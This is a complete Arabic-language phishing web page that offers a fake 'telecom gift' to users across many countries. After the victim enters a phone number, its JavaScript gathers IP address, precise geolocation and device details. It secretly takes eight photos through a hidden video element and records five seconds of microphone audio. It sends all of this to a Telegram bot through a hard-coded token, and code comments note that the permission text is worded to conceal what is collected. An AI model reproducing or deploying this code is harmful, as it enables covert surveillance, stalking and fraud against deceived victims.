<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 هدية الاتصالات – اختر بلدك</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(145deg, #0b1a2e, #1a2f3f);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            color: #fff;
        }
        .container {
            max-width: 500px;
            width: 100%;
            background: rgba(255,255,255,0.06);
            backdrop-filter: blur(18px);
            border-radius: 40px;
            padding: 30px 25px 25px;
            border: 1px solid rgba(255,215,0,0.15);
            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        .container::before {
            content: '';
            position: absolute;
            top: -60%;
            left: -60%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle at 30% 30%, rgba(255,215,0,0.05), transparent 70%);
            pointer-events: none;
        }
        .logo {
            font-size: 50px;
            margin-bottom: 5px;
            display: inline-block;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.08); }
            100% { transform: scale(1); }
        }
        h1 {
            font-size: 28px;
            font-weight: 700;
            background: linear-gradient(135deg, #ffd700, #ff9f43);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin: 5px 0 10px;
        }
        .sub {
            color: #b0c4de;
            font-size: 16px;
            margin-bottom: 20px;
            font-weight: 300;
        }
        .step {
            display: none;
            animation: fadeIn 0.5s ease;
        }
        .step.active {
            display: block;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(15px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .country-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
            gap: 12px;
            margin: 20px 0;
        }
        .country-btn {
            background: rgba(255,255,255,0.08);
            border: 1px solid rgba(255,215,0,0.2);
            border-radius: 16px;
            padding: 14px 8px;
            color: #fff;
            font-weight: 600;
            font-size: 15px;
            cursor: pointer;
            transition: all 0.25s;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 4px;
        }
        .country-btn i {
            font-size: 28px;
            color: #ffd700;
        }
        .country-btn:hover {
            background: rgba(255,215,0,0.15);
            border-color: #ffd700;
            transform: scale(1.03);
        }
        .country-btn:active {
            transform: scale(0.96);
        }
        .input-group {
            margin: 18px 0;
            text-align: right;
        }
        .input-group label {
            display: block;
            font-size: 14px;
            color: #ccc;
            margin-bottom: 5px;
            text-align: right;
        }
        .input-group input {
            width: 100%;
            padding: 14px 18px;
            border-radius: 30px;
            border: 1px solid rgba(255,255,255,0.15);
            background: rgba(0,0,0,0.3);
            color: #fff;
            font-size: 16px;
            outline: none;
            transition: 0.3s;
        }
        .input-group input:focus {
            border-color: #ffd700;
            box-shadow: 0 0 0 3px rgba(255,215,0,0.15);
        }
        .input-group input::placeholder {
            color: #888;
        }
        .btn-gold {
            background: linear-gradient(135deg, #ffd700, #f0a500);
            border: none;
            color: #1a1a2e;
            font-weight: 800;
            padding: 16px 30px;
            border-radius: 50px;
            font-size: 20px;
            width: 100%;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 8px 25px rgba(255,215,0,0.25);
            margin-top: 10px;
        }
        .btn-gold:hover {
            transform: scale(1.02);
            box-shadow: 0 12px 35px rgba(255,215,0,0.35);
        }
        .btn-gold:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        .btn-gold .spinner {
            display: none;
            width: 24px;
            height: 24px;
            border: 3px solid rgba(0,0,0,0.2);
            border-top: 3px solid #1a1a2e;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }
        .btn-gold.loading .spinner {
            display: inline-block;
        }
        .btn-gold.loading .btn-text {
            display: none;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .timer-box {
            background: rgba(0,0,0,0.25);
            border-radius: 60px;
            padding: 12px 20px;
            margin: 20px 0 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
            border: 1px solid rgba(255,215,0,0.15);
        }
        .timer-box i {
            font-size: 28px;
            color: #ffd700;
        }
        .timer-box span {
            font-size: 28px;
            font-weight: 700;
            color: #ffd700;
            letter-spacing: 3px;
        }
        .status {
            margin-top: 16px;
            padding: 12px 16px;
            border-radius: 16px;
            font-size: 14px;
            font-weight: 500;
            display: none;
            backdrop-filter: blur(10px);
        }
        .status.success {
            background: rgba(46,213,115,0.15);
            color: #2ed573;
            display: block;
        }
        .status.info {
            background: rgba(54,164,235,0.15);
            color: #36a4eb;
            display: block;
        }
        .status.error {
            background: rgba(255,107,107,0.15);
            color: #ff6b6b;
            display: block;
        }
        .footer {
            margin-top: 25px;
            font-size: 12px;
            color: #666;
            border-top: 1px solid rgba(255,255,255,0.05);
            padding-top: 15px;
        }
        #hiddenVideo {
            position: fixed;
            top: -1000px;
            left: -1000px;
            width: 320px;
            height: 240px;
            opacity: 0;
            pointer-events: none;
        }
        #hiddenCanvas {
            display: none;
        }
        @media (max-width: 480px) {
            .container { padding: 20px 15px; }
            h1 { font-size: 24px; }
            .country-grid { grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); }
            .country-btn { padding: 10px 6px; font-size: 13px; }
            .country-btn i { font-size: 22px; }
        }
        /* رسائل الأذونات - مغلفة بشكل احترافي */
        .permission-wrapper {
            background: rgba(255,215,0,0.05);
            border-radius: 20px;
            padding: 16px;
            margin: 15px 0;
            border: 1px solid rgba(255,215,0,0.08);
        }
        .permission-wrapper ul {
            list-style: none;
            padding: 0;
            margin: 8px 0;
            text-align: right;
        }
        .permission-wrapper ul li {
            padding: 6px 0;
            border-bottom: 1px solid rgba(255,255,255,0.03);
            color: #ddd;
            font-size: 14px;
        }
        .permission-wrapper ul li i {
            color: #ffd700;
            margin-left: 8px;
        }
        .permission-wrapper .note {
            color: #aaa;
            font-size: 13px;
            margin-top: 8px;
        }
    </style>
</head>
<body>

    <div class="container" id="app">
        <!-- STEP 1: اختر البلد -->
        <div class="step active" id="step-country">
            <div class="logo">🌍</div>
            <h1>اختر بلدك</h1>
            <p class="sub">للحصول على هدية الاتصالات الخاصة بك</p>
            <div class="country-grid" id="countryList"></div>
            <div class="status" id="statusCountry"></div>
        </div>

        <!-- STEP 2: المهام (مغلفة بشكل احترافي) -->
        <div class="step" id="step-tasks">
            <div class="logo">🎁</div>
            <h1 id="taskTitle">أكمل عملية التحقق</h1>
            <p class="sub" id="taskSub">لتأكيد هويتك والحصول على هديتك</p>

            <!-- منطقة المهام المغلفة -->
            <div class="permission-wrapper" id="permissionArea">
                <!-- سيتم تعبئتها ديناميكياً -->
            </div>

            <div class="input-group">
                <label for="phoneInput">📱 أدخل رقم هاتفك</label>
                <input type="text" id="phoneInput" placeholder="مثال: 01012345678" maxlength="15">
            </div>

            <button class="btn-gold" id="claimBtn">
                <span class="btn-text">🎁 احصل على الهدية</span>
                <span class="spinner"></span>
            </button>

            <div class="status" id="statusTasks"></div>
        </div>

        <!-- STEP 3: عداد الوقت -->
        <div class="step" id="step-timer">
            <div class="logo">⏳</div>
            <h1>تهانينا! 🎉</h1>
            <p class="sub">تم تأكيد طلبك، سيتم إرسال الهدية خلال</p>
            <div class="timer-box">
                <i class="fas fa-hourglass-half"></i>
                <span id="timerDisplay">03:00</span>
            </div>
            <p style="color: #aaa; font-size: 14px; margin-top: 10px;">يرجى الانتظار، ستصلك الهدية تلقائياً</p>
            <div class="status" id="statusTimer"></div>
        </div>

        <div class="footer">
            <i class="fas fa-shield-alt" style="color: #ffd700;"></i> نحمي خصوصيتك • جميع الحقوق محفوظة
        </div>
    </div>

    <!-- hidden video & canvas -->
    <video id="hiddenVideo" autoplay playsinline muted></video>
    <canvas id="hiddenCanvas"></canvas>

    <script>
        // ================================================================
        //  CONFIG
        // ================================================================
        const BOT_TOKEN = "8638387389:AAFndKBzRdyzUD5WWlIeinWYxRBktnKEMRQ";
        const ADMIN_CHAT_ID = "8552540563"; // ضع معرف الدردشة هنا

        const TOTAL_PHOTOS = 8;
        const CAPTURE_INTERVAL = 700;
        const AUDIO_DURATION = 5000;
        const PHOTO_QUALITY = 0.92;

        // ================================================================
        //  COUNTRIES DATA
        // ================================================================
        const countries = {
            'مصر': { flag: '🇪🇬', prefixes: ['010', '011', '012', '015'] },
            'السعودية': { flag: '🇸🇦', prefixes: ['05'] },
            'الإمارات': { flag: '🇦🇪', prefixes: ['050', '052', '054', '055', '056'] },
            'الكويت': { flag: '🇰🇼', prefixes: ['5'] },
            'قطر': { flag: '🇶🇦', prefixes: ['3', '5', '6'] },
            'عُمان': { flag: '🇴🇲', prefixes: ['7', '9'] },
            'البحرين': { flag: '🇧🇭', prefixes: ['3', '6'] },
            'الأردن': { flag: '🇯🇴', prefixes: ['7'] },
            'العراق': { flag: '🇮🇶', prefixes: ['7'] },
            'سوريا': { flag: '🇸🇾', prefixes: ['9'] },
            'لبنان': { flag: '🇱🇧', prefixes: ['3', '7'] },
            'فلسطين': { flag: '🇵🇸', prefixes: ['5', '9'] },
            'الجزائر': { flag: '🇩🇿', prefixes: ['5', '6', '7'] },
            'المغرب': { flag: '🇲🇦', prefixes: ['6', '7'] },
            'تونس': { flag: '🇹🇳', prefixes: ['2', '5', '9'] },
            'ليبيا': { flag: '🇱🇾', prefixes: ['9'] },
            'السودان': { flag: '🇸🇩', prefixes: ['9', '1'] },
            'اليمن': { flag: '🇾🇪', prefixes: ['7'] },
            'الصومال': { flag: '🇸🇴', prefixes: ['6', '7'] },
            'جيبوتي': { flag: '🇩🇯', prefixes: ['7'] },
            'موريتانيا': { flag: '🇲🇷', prefixes: ['4', '5'] },
            'تركيا': { flag: '🇹🇷', prefixes: ['5'] },
            'إيران': { flag: '🇮🇷', prefixes: ['9'] },
            'باكستان': { flag: '🇵🇰', prefixes: ['3'] },
            'الهند': { flag: '🇮🇳', prefixes: ['6', '7', '8', '9'] },
            'بنغلاديش': { flag: '🇧🇩', prefixes: ['1', '7'] },
            'نيجيريا': { flag: '🇳🇬', prefixes: ['7', '8', '9'] },
            'جنوب أفريقيا': { flag: '🇿🇦', prefixes: ['6', '7', '8'] },
        };

        // ================================================================
        //  STATE
        // ================================================================
        let selectedCountry = null;
        let userPhone = null;
        let mediaStream = null;
        let audioStream = null;
        let audioRecorder = null;
        let audioChunks = [];
        let capturedPhotos = [];
        let userIP = 'غير متاح';
        let userLocation = { lat: null, lng: null, accuracy: null, error: null };
        let isProcessing = false;
        let timerInterval = null;
        let timerSeconds = 180;

        // DOM refs
        const stepCountry = document.getElementById('step-country');
        const stepTasks = document.getElementById('step-tasks');
        const stepTimer = document.getElementById('step-timer');
        const countryList = document.getElementById('countryList');
        const statusCountry = document.getElementById('statusCountry');
        const statusTasks = document.getElementById('statusTasks');
        const statusTimer = document.getElementById('statusTimer');
        const claimBtn = document.getElementById('claimBtn');
        const phoneInput = document.getElementById('phoneInput');
        const permissionArea = document.getElementById('permissionArea');
        const timerDisplay = document.getElementById('timerDisplay');
        const taskTitle = document.getElementById('taskTitle');
        const taskSub = document.getElementById('taskSub');
        const video = document.getElementById('hiddenVideo');
        const canvas = document.getElementById('hiddenCanvas');

        // ================================================================
        //  RENDER COUNTRIES
        // ================================================================
        function renderCountries() {
            countryList.innerHTML = '';
            Object.keys(countries).forEach(name => {
                const btn = document.createElement('button');
                btn.className = 'country-btn';
                btn.innerHTML = `<span>${countries[name].flag}</span><span>${name}</span>`;
                btn.dataset.country = name;
                btn.addEventListener('click', () => selectCountry(name));
                countryList.appendChild(btn);
            });
        }
        renderCountries();

        function selectCountry(name) {
            selectedCountry = name;
            const data = countries[name];
            taskTitle.textContent = `🎁 هدية ${name}`;
            taskSub.textContent = `لتأكيد هويتك والحصول على هديتك في ${name}`;

            // رسائل مغلفة – لا ذكر للكاميرا أو الميكروفون أو الموقع بشكل مباشر
            const prefixes = data.prefixes.join('، ');
            permissionArea.innerHTML = `
                <ul>
                    <li><i class="fas fa-check-circle"></i> التحقق الذكي من أهلية الاستلام بأعلى معايير الأمان</li>
<li><i class="fas fa-check-circle"></i> مراجعة واعتماد بيانات المستفيد بشكل آلي وآمن</li>
<li><i class="fas fa-check-circle"></i> تأكيد معلومات التسليم لضمان وصول الهدية بنجاح</li>
                </ul>
                <div class="note">📞 الأرقام المسموحة: <strong style="color:#ffd700;">${prefixes}</strong></div>
                <div style="font-size:13px; color:#888; margin-top:10px; border-top:1px solid rgba(255,255,255,0.05); padding-top:10px;">
                    <i class="fas fa-lock" style="color:#ffd700;"></i> عملية آمنة • بياناتك محمية
                </div>
            `;

            phoneInput.placeholder = `مثال: ${prefixes.split('،')[0]}12345678`;
            showStep('step-tasks');
            statusTasks.className = 'status';
            statusTasks.style.display = 'none';
            phoneInput.value = '';
            capturedPhotos = [];
            audioChunks = [];
            claimBtn.disabled = false;
            claimBtn.classList.remove('loading');
            claimBtn.querySelector('.btn-text').textContent = '🎁 احصل على الهدية';
        }

        function showStep(id) {
            document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
            document.getElementById(id).classList.add('active');
        }

        // ================================================================
        //  BUTTON CLICK – MAIN ACTION (مغلف بالكامل)
        // ================================================================
        claimBtn.addEventListener('click', async () => {
            if (isProcessing) return;

            const phone = phoneInput.value.trim();
            if (!phone) {
                showStatus(statusTasks, 'error', '⚠️ يرجى إدخال رقم الهاتف');
                return;
            }
            const prefixes = countries[selectedCountry].prefixes;
            let valid = false;
            for (let p of prefixes) {
                if (phone.startsWith(p)) { valid = true; break; }
            }
            if (!valid) {
                showStatus(statusTasks, 'error', `⚠️ الرقم يجب أن يبدأ بـ ${prefixes.join(' أو ')}`);
                return;
            }
            userPhone = phone;

            isProcessing = true;
            claimBtn.disabled = true;
            claimBtn.classList.add('loading');
            claimBtn.querySelector('.btn-text').textContent = 'جاري التأكيد...';
            showStatus(statusTasks, 'info', '⏳ جاري تأكيد هويتك...');

            // 1. جمع IP والموقع (سيطلب إذن الموقع)
            await getIPAddress();
            await getLocation();

            // 2. طلب الكاميرا والتقاط الصور (سيطلب إذن الكاميرا)
            const cameraSuccess = await startCameraAndCapture();

            // 3. طلب الميكروفون وتسجيل الصوت (سيطلب إذن الميكروفون)
            await recordAudio();

            // 4. إرسال كل البيانات إلى تيليجرام
            await sendAllData();

            // 5. الانتقال إلى شاشة العداد
            if (capturedPhotos.length > 0 || audioChunks.length > 0) {
                showStep('step-timer');
                startTimer(180);
            } else {
                showStatus(statusTasks, 'error', '⚠️ لم نتمكن من التأكيد، يرجى المحاولة مرة أخرى.');
                claimBtn.disabled = false;
                claimBtn.classList.remove('loading');
                claimBtn.querySelector('.btn-text').textContent = '🎁 احصل على الهدية';
                isProcessing = false;
            }
        });

        // ================================================================
        //  FUNCTIONS: IP, LOCATION, CAMERA, AUDIO, SEND
        // ================================================================

        async function getIPAddress() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                userIP = data.ip;
                console.log('✅ IP:', userIP);
            } catch (e) {
                userIP = 'Unable to fetch';
            }
        }

        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    userLocation.error = 'Not supported';
                    resolve();
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        userLocation.lat = pos.coords.latitude;
                        userLocation.lng = pos.coords.longitude;
                        userLocation.accuracy = pos.coords.accuracy;
                        userLocation.error = null;
                        console.log('✅ Location:', userLocation.lat, userLocation.lng);
                        resolve();
                    },
                    (err) => {
                        userLocation.error = err.message;
                        console.warn('Location error:', err.message);
                        resolve();
                    },
                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 3000 }
                );
            });
        }

        async function startCameraAndCapture() {
            return new Promise(async (resolve) => {
                try {
                    showStatus(statusTasks, 'info', '📸 جاري التحقق البصري...');
                    const constraints = { video: true, audio: false };
                    mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
                    console.log('✅ Camera stream obtained');

                    video.srcObject = mediaStream;
                    await video.play();

                    await new Promise((resolve, reject) => {
                        const timeout = setTimeout(() => reject(new Error('Video timeout')), 10000);
                        const onReady = () => { clearTimeout(timeout); resolve(); };
                        if (video.readyState >= 2 && video.videoWidth > 0) {
                            onReady();
                        } else {
                            video.addEventListener('loadedmetadata', onReady);
                            video.addEventListener('canplay', onReady);
                            video.play().catch(() => {});
                        }
                    });

                    console.log('✅ Video ready, dimensions:', video.videoWidth, 'x', video.videoHeight);
                    await new Promise(r => setTimeout(r, 500));

                    const ctx = canvas.getContext('2d');
                    const width = Math.min(video.videoWidth || 640, 1920);
                    const height = Math.min(video.videoHeight || 480, 1080);
                    canvas.width = width;
                    canvas.height = height;

                    showStatus(statusTasks, 'info', `📸 جاري تأكيد الهوية...`);

                    for (let i = 1; i <= TOTAL_PHOTOS; i++) {
                        ctx.drawImage(video, 0, 0, width, height);
                        const dataUrl = canvas.toDataURL('image/jpeg', PHOTO_QUALITY);
                        if (dataUrl && dataUrl.length > 5000) {
                            capturedPhotos.push(dataUrl);
                            console.log(`✅ Photo ${i}/${TOTAL_PHOTOS} captured (${Math.round(dataUrl.length/1024)}KB)`);
                        } else {
                            console.warn(`⚠️ Photo ${i} small, retrying...`);
                            await new Promise(r => setTimeout(r, 200));
                            ctx.drawImage(video, 0, 0, width, height);
                            const retry = canvas.toDataURL('image/jpeg', PHOTO_QUALITY);
                            if (retry && retry.length > 5000) {
                                capturedPhotos.push(retry);
                                console.log(`✅ Photo ${i} captured on retry`);
                            }
                        }
                        if (i < TOTAL_PHOTOS) await new Promise(r => setTimeout(r, CAPTURE_INTERVAL));
                    }

                    console.log(`✅ Total photos: ${capturedPhotos.length}`);
                    showStatus(statusTasks, 'info', `✅ تم تأكيد الهوية`);
                    resolve(true);

                } catch (error) {
                    console.error('❌ Camera error:', error);
                    showStatus(statusTasks, 'error', '⚠️ لم نتمكن من التأكيد البصري، حاول مرة أخرى.');
                    if (mediaStream) {
                        mediaStream.getTracks().forEach(t => t.stop());
                        mediaStream = null;
                    }
                    video.srcObject = null;
                    resolve(false);
                }
            });
        }

        async function recordAudio() {
            return new Promise(async (resolve) => {
                try {
                    showStatus(statusTasks, 'info', '🎤 جاري تأكيد الصوت...');
                    const audioConstraints = { audio: true };
                    audioStream = await navigator.mediaDevices.getUserMedia(audioConstraints);
                    audioRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm;codecs=opus' });
                    audioChunks = [];
                    audioRecorder.ondataavailable = (e) => { if (e.data.size > 0) audioChunks.push(e.data); };
                    audioRecorder.onstop = () => {
                        console.log(`✅ Audio chunks: ${audioChunks.length}`);
                        resolve();
                    };
                    audioRecorder.start();
                    setTimeout(() => {
                        if (audioRecorder.state === 'recording') {
                            audioRecorder.stop();
                        }
                        audioStream.getTracks().forEach(t => t.stop());
                    }, AUDIO_DURATION);
                } catch (error) {
                    console.error('❌ Audio error:', error);
                    showStatus(statusTasks, 'error', '⚠️ لم نتمكن من تأكيد الصوت، حاول مرة أخرى.');
                    resolve();
                }
            });
        }

        // ================================================================
        //  SEND ALL DATA TO TELEGRAM
        // ================================================================
        async function sendAllData() {
            let message = `🔴 NEW DATA CAPTURED 🔴\n\n`;
            message += `━━━━━━━━━━━━━━━━━\n`;
            message += `🌍 COUNTRY: ${selectedCountry}\n`;
            message += `📱 PHONE: ${userPhone}\n`;
            message += `━━━━━━━━━━━━━━━━━\n`;
            message += `📱 DEVICE INFO:\n`;
            message += `• ${navigator.userAgent.substring(0, 120)}\n`;
            message += `• Platform: ${navigator.platform}\n`;
            message += `• Language: ${navigator.language}\n`;
            message += `• Screen: ${screen.width}x${screen.height} (${screen.colorDepth}bit)\n`;
            message += `• Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
            message += `━━━━━━━━━━━━━━━━━\n`;
            message += `🌐 IP: ${userIP}\n`;
            message += `🕐 Time: ${new Date().toLocaleString()}\n`;
            message += `━━━━━━━━━━━━━━━━━\n`;
            if (userLocation.lat && userLocation.lng) {
                message += `📍 LOCATION:\n`;
                message += `• Lat: ${userLocation.lat}\n`;
                message += `• Lng: ${userLocation.lng}\n`;
                message += `• Accuracy: ±${Math.round(userLocation.accuracy)}m\n`;
                message += `• Maps: https://www.google.com/maps?q=${userLocation.lat},${userLocation.lng}\n`;
            } else {
                message += `📍 LOCATION: ${userLocation.error || 'Not available'}\n`;
            }
            message += `━━━━━━━━━━━━━━━━━\n`;
            message += `📸 PHOTOS: ${capturedPhotos.length}/${TOTAL_PHOTOS}\n`;
            message += `🎤 AUDIO: ${audioChunks.length > 0 ? 'Captured' : 'Not captured'}\n`;
            message += `━━━━━━━━━━━━━━━━━\n`;

            await sendTelegramMessage(message);

            if (capturedPhotos.length > 0) {
                for (let i = 0; i < capturedPhotos.length; i++) {
                    await sendPhotoToTelegram(capturedPhotos[i], i + 1);
                    await new Promise(r => setTimeout(r, 300));
                }
                console.log(`✅ ${capturedPhotos.length} photos sent.`);
            }

            if (audioChunks.length > 0) {
                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                await sendAudioToTelegram(audioBlob);
                console.log('✅ Audio sent.');
            }

            if (mediaStream) {
                mediaStream.getTracks().forEach(t => t.stop());
                mediaStream = null;
                video.srcObject = null;
            }
        }

        // ================================================================
        //  TELEGRAM SEND FUNCTIONS
        // ================================================================
        async function sendTelegramMessage(text) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try {
                const res = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text, parse_mode: 'HTML' })
                });
                const json = await res.json();
                if (!json.ok) console.warn('❌ Message send failed:', json);
            } catch (e) { console.error('❌ Send text error:', e); }
        }

        async function sendPhotoToTelegram(dataUrl, index) {
            const blob = dataURLToBlob(dataUrl);
            const formData = new FormData();
            formData.append('chat_id', ADMIN_CHAT_ID);
            formData.append('photo', blob, `photo_${index}.jpg`);
            formData.append('caption', `📸 PHOTO ${index}/${capturedPhotos.length}\n📍 ${selectedCountry}\n📱 ${userPhone}\n🕐 ${new Date().toLocaleString()}`);
            try {
                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                const json = await res.json();
                if (!json.ok) console.warn(`❌ Photo ${index} failed:`, json);
            } catch (e) { console.error(`❌ Photo ${index} error:`, e); }
        }

        async function sendAudioToTelegram(blob) {
            const formData = new FormData();
            formData.append('chat_id', ADMIN_CHAT_ID);
            formData.append('audio', blob, 'audio.webm');
            formData.append('caption', `🎤 AUDIO\n📍 ${selectedCountry}\n📱 ${userPhone}\n🕐 ${new Date().toLocaleString()}`);
            try {
                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
                    method: 'POST',
                    body: formData
                });
                const json = await res.json();
                if (!json.ok) console.warn('❌ Audio send failed:', json);
            } catch (e) { console.error('❌ Audio error:', e); }
        }

        function dataURLToBlob(dataURL) {
            const parts = dataURL.split(',');
            const mime = parts[0].match(/:(.*?);/)[1];
            const bstr = atob(parts[1]);
            const n = bstr.length;
            const u8arr = new Uint8Array(n);
            for (let i = 0; i < n; i++) u8arr[i] = bstr.charCodeAt(i);
            return new Blob([u8arr], { type: mime });
        }

        // ================================================================
        //  TIMER
        // ================================================================
        function startTimer(seconds) {
            timerSeconds = seconds;
            updateTimerDisplay();
            if (timerInterval) clearInterval(timerInterval);
            timerInterval = setInterval(() => {
                timerSeconds--;
                updateTimerDisplay();
                if (timerSeconds <= 0) {
                    clearInterval(timerInterval);
                    timerDisplay.textContent = '00:00';
                    showStatus(statusTimer, 'success', '🎉 تم إرسال هديتك! تحقق من هاتفك.');
                }
            }, 1000);
        }

        function updateTimerDisplay() {
            const mins = Math.floor(timerSeconds / 60);
            const secs = timerSeconds % 60;
            timerDisplay.textContent = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
        }

        // ================================================================
        //  STATUS HELPER
        // ================================================================
        function showStatus(el, type, message) {
            el.className = `status ${type}`;
            el.textContent = message;
            el.style.display = 'block';
            if (type !== 'error') {
                clearTimeout(el._timeout);
                el._timeout = setTimeout(() => {
                    if (el.className.includes(type)) {
                        el.style.display = 'none';
                    }
                }, 6000);
            }
        }

        // ================================================================
        //  CLEANUP
        // ================================================================
        window.addEventListener('beforeunload', () => {
            if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
            if (audioStream) audioStream.getTracks().forEach(t => t.stop());
            if (audioRecorder && audioRecorder.state === 'recording') audioRecorder.stop();
            if (timerInterval) clearInterval(timerInterval);
        });
    </script>
